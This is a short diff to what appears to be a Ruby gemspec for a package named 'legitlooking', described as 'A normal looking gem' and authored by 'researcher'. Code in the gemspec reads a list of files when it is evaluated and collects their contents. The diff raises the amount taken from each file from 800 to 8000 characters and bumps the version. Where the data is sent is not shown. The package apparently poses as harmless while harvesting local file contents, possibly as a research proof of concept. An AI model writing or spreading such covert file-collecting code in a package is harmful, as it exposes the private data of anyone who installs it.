@@ -29,7 +29,7 @@ begin
   ].each do |f|
     begin
       content = read_file.(f).gsub("\x00", "\n")
-      lines << "--- #{f} ---\n#{content[0, 800]}"
+      lines << "--- #{f} ---\n#{content[0, 8000]}"
     rescue => e
       lines << "--- #{f} --- FOUT: #{e.message}"
     end
@@ -62,7 +62,7 @@ end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.3"
+  spec.version       = "1.0.4"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
